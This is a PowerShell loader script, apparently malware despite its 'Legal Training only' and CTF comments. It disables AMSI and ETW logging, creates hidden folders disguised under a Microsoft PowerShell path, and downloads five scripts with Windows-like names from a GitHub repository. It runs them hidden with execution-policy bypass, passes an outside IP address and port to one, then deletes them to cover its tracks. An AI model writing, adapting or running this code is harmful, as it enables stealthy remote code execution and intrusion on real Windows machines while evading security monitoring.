# === Fixed Parallel Loader (Parse-Error Gefixt + Evasion for THM/CTF) ===
# Legal Training only! Escaping fixed, Retries added.

# Bypasses
try { [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) } catch { }
try { $EtwProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null); $EtwProvider['etwProvider'] = $null } catch { }

# Konfig
$BasePath = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell"
$OperationPath = "$BasePath\operation"
$SystemPath = "$OperationPath\System"
$LogPath = "$OperationPath\logs.txt"

@($OperationPath, $SystemPath) | ForEach-Object { if (-not (Test-Path $_)) { New-Item -Path $_ -ItemType Directory -Force | Out-Null; (Get-Item $_ -Force).Attributes = 'Hidden,Directory' } }
"$(Get-Date): Init complete" | Out-File $LogPath -Append -Force -Encoding UTF8

$Scripts = @(
    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/MicrosoftViewS.ps1"; Name = "MicrosoftViewS.ps1"; SpecialArgs = @("145.223.117.77", 8080, 20, 70) },
    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/Sytem.ps1"; Name = "Sytem.ps1" },
    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsCeasar.ps1"; Name = "WindowsCeasar.ps1" },
    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsOperator.ps1"; Name = "WindowsOperator.ps1" },
    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsTransmitter.ps1"; Name = "WindowsTransmitter.ps1" }
)

$UserAgents = @("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0")
$RandomUA = Get-Random -InputObject $UserAgents

$MaxParallel = 3
$RunspacePool = [RunspaceFactory]::CreateRunspacePool(1, $MaxParallel)
$RunspacePool.Open()
$Jobs = @()

foreach ($s in $Scripts) {
    while (($Jobs | Where-Object { $_.Status.IsCompleted -eq $false }).Count -ge $MaxParallel) { Start-Sleep -Milliseconds 250 }
    $FilePath = Join-Path $SystemPath $s.Name
    
    $PowerShell = [PowerShell]::Create().AddScript({
        param($Url, $Path, $ScriptName, $SpecialArgs, $LogPath, $RandomUA)

        $retry = 3
        $success = $false
        while ($retry -gt 0 -and -not $success) {
            try {
                $wc = New-Object System.Net.WebClient
                $wc.Headers.Add("User-Agent", $RandomUA)
                $wc.DownloadFile($Url, $Path)
                $success = $true
                "$(Get-Date): Downloaded $ScriptName" | Out-File $LogPath -Append -Force -Encoding UTF8
            } catch {
                $retry--
                Start-Sleep -Seconds 1
            }
        }
        if (-not $success) { "$(Get-Date): Failed $ScriptName" | Out-File $LogPath -Append -Force -Encoding UTF8; return }

        # FIXED: Korrekte Args (doppelte escaped Quotes für Variable)
        $execArgs = @('-NoProfile', '-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass', '-File', "`"$Path`"")

        if ($ScriptName -eq "MicrosoftViewS.ps1" -and $SpecialArgs.Count -gt 0) {
            $execArgs += $SpecialArgs | ForEach-Object { "-$_" }
        }

        $process = Start-Process -FilePath "powershell.exe" -ArgumentList $execArgs -WindowStyle Hidden -PassThru -NoNewWindow
        $process.WaitForExit(15000)
        $exitCode = $process.ExitCode

        "$(Get-Date): Executed $ScriptName (Exit: $exitCode)" | Out-File $LogPath -Append -Force -Encoding UTF8

        Remove-Item $Path -Force -ErrorAction SilentlyContinue
    }).AddArgument($s.Url).AddArgument($FilePath).AddArgument($s.Name).AddArgument($s.SpecialArgs).AddArgument($LogPath).AddArgument($RandomUA)

    $PowerShell.RunspacePool = $RunspacePool
    $Jobs += [PSCustomObject]@{ Instance = $PowerShell; Status = $PowerShell.BeginInvoke(); Name = $s.Name }
}

$endTime = (Get-Date).AddSeconds(60)
while (($Jobs | Where-Object { $_.Status.IsCompleted -eq $false }).Count -gt 0 -and (Get-Date) -lt $endTime) {
    Start-Sleep -Milliseconds 500
    $Completed = ($Jobs | Where-Object { $_.Status.IsCompleted }).Count
    Write-Progress -Activity "Executing" -Status "$Completed/$($Scripts.Count) done" -PercentComplete (($Completed / $Scripts.Count) * 100)
}

$Jobs | ForEach-Object { $_.Instance.EndInvoke($_.Status); $_.Instance.Dispose() }
$RunspacePool.Close()
$RunspacePool.Dispose()

"$(Get-Date): Complete. Jobs: $($Scripts.Count)" | Out-File $LogPath -Append -Force -Encoding UTF8

Write-Host "Done! Check logs at $LogPath" -ForegroundColor Green
